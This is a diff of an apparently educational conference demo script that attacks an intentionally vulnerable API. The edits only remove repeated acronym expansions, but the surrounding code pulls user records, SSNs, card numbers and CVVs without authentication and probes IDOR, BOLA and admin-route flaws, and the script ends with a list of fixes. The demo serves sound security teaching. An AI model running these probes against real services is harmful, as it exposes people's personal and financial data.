@@ -5,11 +5,11 @@
  *
  * Streamlined 5-phase high-impact conference demo:
  *   1. [Phase 01 · Reset] (optional via --reset)
- *   2. Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) (Insecure Direct Object Reference) / debug / search)
+ *   2. Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) / debug / search)
  *   3. Path traversal on /api/files (steals JWT_SECRET)
  *   4. Open proxy / SSRF on /api/proxy (cloud edge vs app security)
  *   5. Login flood / rate limiting (framework gap)
- *   6. Login, BOLA (Broken Object Level Authorization) (Broken Object Level Authorization), admin, mass assignment, & forged admin JWT (climax)
+ *   6. Login, BOLA (Broken Object Level Authorization), admin, mass assignment, & forged admin JWT (climax)
  *
  * Usage:
  *   node --no-warnings attack/attackv2.mjs <API_BASE_URL> --drama --projector --reset
@@ -430,11 +430,11 @@ async function phaseReset() {
 }
 
 /**
- * PHASE 12 · Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) (Insecure Direct Object Reference) / debug / search)
+ * PHASE 12 · Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) / debug / search)
  */
 async function phaseUnauthDataTheft() {
-    step("Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) (Insecure Direct Object Reference) / debug / search)");
-    intent("JWT claim: no password, no token — full PII (Personally Identifiable Information) (Personally Identifiable Information). Authn was never applied.");
+    step("Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) / debug / search)");
+    intent("JWT claim: no password, no token — full PII (Personally Identifiable Information). Authn was never applied.");
 
     narrate("Dumping /api/users with zero Authorization header…");
     const usersRes = await http("GET", "/api/users", { label: "user-dump" });
@@ -458,17 +458,17 @@ async function phaseUnauthDataTheft() {
     }
 
     const id = stolen.users[0]?.id ?? 1;
-    narrate(`IDOR (Insecure Direct Object Reference) (Insecure Direct Object Reference): fetch /api/users/${id} still without auth…`);
+    narrate(`IDOR (Insecure Direct Object Reference): fetch /api/users/${id} still without auth…`);
     const one = await http("GET", `/api/users/${id}`, { label: "idor-user" });
     if (one.status === 200 && one.json?.user?.ssn) {
-        bad(`Full PII (Personally Identifiable Information) (Personally Identifiable Information) for user #${id}`);
+        bad(`Full PII (Personally Identifiable Information) for user #${id}`);
         loot("SSN", one.json.user.ssn);
         loot("card", one.json.user.cardNumber);
         loot("CVV", one.json.user.cardCvv);
         loot("note", one.json.user.internalNote);
         record(
             "CRITICAL",
-            "IDOR (Insecure Direct Object Reference) (Insecure Direct Object Reference) on /api/users/:id without auth",
+            "IDOR (Insecure Direct Object Reference) on /api/users/:id without auth",
             "Walk the id space — no auth, no ownership check",
             { kind: "app-code", owasp: "API1" }
         );
@@ -489,16 +489,16 @@ async function phaseUnauthDataTheft() {
         );
     }
 
-    narrate('Searching PII (Personally Identifiable Information) (Personally Identifiable Information) with q="oslo"…');
+    narrate('Searching PII (Personally Identifiable Information) with q="oslo"…');
     const search = await http("GET", "/api/search?q=oslo", { label: "pii-search" });
     if (search.status === 200 && (search.json?.results?.length || 0) > 0) {
-        bad(`Search returned ${search.json.results.length} PII (Personally Identifiable Information) (Personally Identifiable Information) hits without auth`);
+        bad(`Search returned ${search.json.results.length} PII (Personally Identifiable Information) hits without auth`);
         for (const r of search.json.results) {
             loot(r.email, `${r.name} | ${r.address} | ${r.ssn}`);
         }
         record(
             "HIGH",
-            "Unauthenticated PII (Personally Identifiable Information) (Personally Identifiable Information) search",
+            "Unauthenticated PII (Personally Identifiable Information) search",
             "Search exposes sensitive object properties without filtering (API3), and lacks function access control (also API5).",
             { kind: "app-code", owasp: "API3" }
         );
@@ -850,10 +850,10 @@ async function demoLogin() {
 }
 
 /**
- * PHASE 16 · Login, BOLA (Broken Object Level Authorization) (Broken Object Level Authorization), admin, mass assignment, JWT forge
+ * PHASE 16 · Login, BOLA (Broken Object Level Authorization), admin, mass assignment, JWT forge
  */
 async function phaseAuthzAndForgery() {
-    step("Login, BOLA (Broken Object Level Authorization) (Broken Object Level Authorization), admin, mass assignment, JWT forge");
+    step("Login, BOLA (Broken Object Level Authorization), admin, mass assignment, JWT forge");
     intent("JWT proves someone logged in. It does not decide what they may read or write.");
 
     const loginOk = await demoLogin();
@@ -877,18 +877,18 @@ async function phaseAuthzAndForgery() {
             stolen.orders.map((o) => o.userId).filter((id) => id !== loginOk.user.id)
         );
         if (others.size > 0 && loginOk.user.role !== "admin") {
-            bad(`Got ${stolen.orders.length} orders spanning ${1 + others.size} users (BOLA (Broken Object Level Authorization) (Broken Object Level Authorization))`);
+            bad(`Got ${stolen.orders.length} orders spanning ${1 + others.size} users (BOLA (Broken Object Level Authorization))`);
             for (const o of stolen.orders.slice(0, 8)) {
                 loot(`Order #${o.id}`, `userId=${o.userId} ${o.merchant} $${o.amount} ····${o.cardLast4}`);
             }
             record(
                 "CRITICAL",
-                "BOLA (Broken Object Level Authorization) (Broken Object Level Authorization) on /api/orders",
+                "BOLA (Broken Object Level Authorization) on /api/orders",
                 "Authn present, authz missing — any login reads every order",
                 { kind: "app-code", owasp: "API1" }
             );
         } else if (loginOk.user.role === "admin") {
-            info("Admin fallback cannot establish unauthorized cross-user order access; no BOLA (Broken Object Level Authorization) (Broken Object Level Authorization) finding counted");
+            info("Admin fallback cannot establish unauthorized cross-user order access; no BOLA (Broken Object Level Authorization) finding counted");
         } else {
             ok(`Orders scoped to self (${stolen.orders.length} order(s) for user #${loginOk.user.id})`);
         }
@@ -911,14 +911,14 @@ async function phaseAuthzAndForgery() {
             record(
                 "CRITICAL",
                 "Admin route accessible to a non-admin identity",
-                "Observed before role mutation: a regular user's token accesses the administrative account dump (BFLA (Broken Function Level Authorization) (Broken Function Level Authorization)).",
+                "Observed before role mutation: a regular user's token accesses the administrative account dump (BFLA (Broken Function Level Authorization)).",
                 { kind: "app-code", owasp: "API5" }
             );
         } else {
-            info(`Non-admin access probe returned ${stats.status}; BFLA (Broken Function Level Authorization) (Broken Function Level Authorization) not confirmed`);
+            info(`Non-admin access probe returned ${stats.status}; BFLA (Broken Function Level Authorization) not confirmed`);
         }
     } else {
-        info("Login fallback is already admin; skip non-admin BFLA (Broken Function Level Authorization) (Broken Function Level Authorization) and privilege-escalation claims");
+        info("Login fallback is already admin; skip non-admin BFLA (Broken Function Level Authorization) and privilege-escalation claims");
     }
 
     const victimId = escId === 2 ? 1 : 2;
@@ -1041,8 +1041,8 @@ ${c.bold}${c.green}╔═══════════════════�
 ╚══════════════════════════════════════════════════════════════════════╝${c.reset}
 `);
     console.log(`  ${c.red}${c.bold}(app-code)${c.reset}  — fix in your handlers (framework will not invent these)
-    · Ownership (BOLA (Broken Object Level Authorization) (Broken Object Level Authorization)/IDOR (Insecure Direct Object Reference) (Insecure Direct Object Reference)): order.userId === req.user.sub — on every read AND write
-    · Roles (BFLA (Broken Function Level Authorization) (Broken Function Level Authorization)): requireRole("admin") — login alone is not enough
+    · Ownership (BOLA (Broken Object Level Authorization)/IDOR (Insecure Direct Object Reference)): order.userId === req.user.sub — on every read AND write
+    · Roles (BFLA (Broken Function Level Authorization)): requireRole("admin") — login alone is not enough
     · Request field allowlist — never merge raw JSON into user/role
     · Response field allowlist — pick what you return; no ssn/cardNumber leaving endpoints
     · Path jail on any file path from user input
